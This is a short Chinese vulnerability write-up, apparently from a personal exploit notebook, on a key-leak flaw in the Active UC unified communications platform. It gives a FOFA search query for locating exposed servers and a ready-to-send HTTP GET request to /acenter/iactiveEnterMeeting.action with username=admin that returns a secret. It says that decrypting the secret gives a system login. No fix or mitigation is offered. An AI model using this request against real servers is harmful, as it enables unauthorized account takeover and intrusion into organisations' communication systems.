# 网动统一通信平台iactiveEnterMeeting存在密钥泄露漏洞

# 一、漏洞简介
 网动统一通信平台是一个涵盖了多种通信功能的综合平台，通常包括文字、语音、视频通讯等功能，并且可能提供了一系列的通讯工具和服务。这样的平台通常旨在提升用户的沟通效率和便利性，为用户提供一个统一的通信环境。网动统一通信平台iactiveEnterMeeting存在密钥泄露漏洞

# 二、影响版本
+ 网动统一通信平台

# 三、资产测绘
+ fofa`title="网动统一通信平台(Active UC)"`
+ 特征

![1715181346183-38fe9fce-95da-4fcc-9444-e758323b5b48.png](./img/bchEO-h-HB8Wt1xO/1715181346183-38fe9fce-95da-4fcc-9444-e758323b5b48-583994.png)

---

# 四、漏洞复现
```http
GET /acenter/iactiveEnterMeeting.action?roomid=1&username=admin HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
```

![1728895972113-cd2610be-9b1a-425a-a4c5-db5f41756e26.png](./img/bchEO-h-HB8Wt1xO/1728895972113-cd2610be-9b1a-425a-a4c5-db5f41756e26-783469.png)

解密后可登录系统

![1728896161193-80cbf6bb-9a72-40fa-90e6-0b901c7ad4d7.png](./img/bchEO-h-HB8Wt1xO/1728896161193-80cbf6bb-9a72-40fa-90e6-0b901c7ad4d7-462992.png)



> 更新: 2024-10-22 09:40:55  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rq6gi25kn08phghs>